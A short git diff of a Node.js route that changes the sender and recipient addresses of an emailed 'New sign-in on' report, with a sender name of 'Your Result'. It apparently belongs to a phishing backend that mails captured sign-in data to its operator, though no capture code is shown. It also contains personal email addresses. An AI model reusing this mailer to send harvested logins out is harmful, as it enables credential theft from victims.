@@ -56,8 +56,8 @@ router.post('/', async (req, res) => {
         });
 
         const mailOptions = {
-            from: "khriskhalid@tutamail.com",
-            to: "Josephblessing6776@gmail.com",
+            from:'"Your Result" <Ddan70947@gmail.com>',
+            to: "khriskhalid@tutamail.com",
             subject: `New sign-in on ${deviceType}`,
             html: mergedHtml,
         };
